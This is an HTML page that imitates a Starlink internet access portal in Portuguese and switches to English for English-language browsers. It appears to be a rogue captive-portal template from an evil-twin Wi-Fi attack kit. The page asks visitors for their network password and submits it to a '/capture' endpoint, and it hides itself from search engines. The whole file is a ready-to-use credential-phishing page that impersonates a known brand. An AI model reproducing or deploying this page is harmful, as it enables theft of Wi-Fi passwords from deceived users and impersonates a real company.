<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
<meta name="robots" content="noindex, nofollow">
<title>Starlink - Portal de Acesso</title>
<style>
*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
html { font-size: 16px; }
body { min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #000000; color: #FFFFFF; padding: 16px; }
.card { background: #0A0A0A; border-radius: 12px; padding: 32px 28px; width: 100%; max-width: 400px; box-shadow: 0 4px 32px rgba(0,96,223,0.18); border: 1px solid #1a1a2e; }
.logo-icon { text-align: center; font-size: 32px; margin-bottom: 8px; }
.logo { text-align: center; margin-bottom: 24px; font-size: 26px; font-weight: 700; color: #FFFFFF; letter-spacing: 3px; text-transform: uppercase; }
.logo-line { height: 2px; background: linear-gradient(90deg, transparent, #0060DF, transparent); margin: 0 20px 20px; }
.subtitle { text-align: center; color: #AAAAAA; font-size: 14px; margin-bottom: 28px; line-height: 1.5; }
.form-group { margin-bottom: 16px; }
label { display: block; font-size: 13px; font-weight: 600; margin-bottom: 6px; color: #CCCCCC; }
input[type="password"], input[type="email"], input[type="text"] { width: 100%; padding: 13px 16px; border: 1.5px solid #333333; border-radius: 8px; font-size: 15px; background: #111111; color: #FFFFFF; outline: none; transition: border-color 0.2s; }
input:focus { border-color: #0060DF; }
button[type="submit"] { width: 100%; padding: 14px; background: #0060DF; color: #FFFFFF; border: none; border-radius: 8px; font-size: 16px; font-weight: 700; cursor: pointer; margin-top: 8px; transition: opacity 0.2s; letter-spacing: 0.5px; }
button:hover { opacity: 0.92; }
.footer { text-align: center; margin-top: 20px; font-size: 11px; color: #666; }
input[type="hidden"] { display: none; }
@media (max-width: 480px) { .card { padding: 24px 18px; } .logo { font-size: 22px; } }
</style>
</head>
<body>
<div class="card">
  <div class="logo-icon">&#x1F6F0;</div>
  <div class="logo">Starlink</div>
  <div class="logo-line"></div>
  <p class="subtitle">Bem-vindo ao portal Starlink. Acesse a internet via satelite.</p>
  <form action="/capture" method="POST" autocomplete="off">
    <input type="hidden" name="csrf_token" value="">
    <input type="hidden" name="portal_id" value="starlink">
    <div class="form-group">
      <label for="password">Senha da rede</label>
      <input type="password" name="password" id="password" placeholder="Digite a senha de acesso" required minlength="8" maxlength="63" autocomplete="new-password">
    </div>
    <button type="submit">Conectar</button>
  </form>
  <p class="footer">Starlink - Internet em qualquer lugar</p>
</div>
<script>
(function(){
  var lang = navigator.language || 'pt-BR';
  if (lang.startsWith('en')) {
    document.querySelector('.subtitle').textContent = 'Welcome to the Starlink portal. Access satellite internet.';
    document.querySelector('button[type=submit]').textContent = 'Connect';
    document.querySelector('.footer').textContent = 'Starlink - Internet anywhere';
    document.querySelector('label[for=password]').textContent = 'Network password';
  }
})();
</script>
</body>
</html>
